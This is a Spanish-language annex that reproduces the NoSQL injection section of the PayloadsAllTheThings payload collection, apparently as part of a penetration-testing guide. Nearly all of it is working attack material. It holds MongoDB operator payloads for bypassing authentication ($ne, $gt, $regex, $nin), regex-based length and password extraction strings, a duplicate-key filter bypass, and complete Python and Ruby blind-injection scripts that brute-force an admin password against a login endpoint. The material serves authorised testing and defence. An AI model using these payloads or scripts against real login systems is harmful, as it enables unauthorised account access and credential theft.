# NoSQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [NoSQL Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/NoSQL%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. NoSQL Inyección / Metodología

### Variantes presentes en tablas o texto del apartado

```text
$ne
$gt
$regex
$where
```

## 2. Metodología / Operator Inyección

```js
db.products.find({ "price": userInput })
```

```js
db.products.find({ "price": { "$gt": 0 } })
```

### Variantes presentes en tablas o texto del apartado

```text
{ "$gt": 0 }
```

## 3. Metodología / Autenticación Evasión

```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
```

### Variantes presentes en tablas o texto del apartado

```text
$ne
$gt
```

## 4. Metodología / Extraer Length Información

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

## 5. Metodología / Extraer datos Información

```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
```

```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Variantes presentes en tablas o texto del apartado

```text
$regex
$in
```

## 6. Metodología / WAF and Filters

```js
{"id":"10", "id":"100"} 
```

## 7. Ciega NoSQL / POST Con JSON Body

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

## 8. Ciega NoSQL / POST Con urlencoded Body

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

## 9. Ciega NoSQL / GET

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
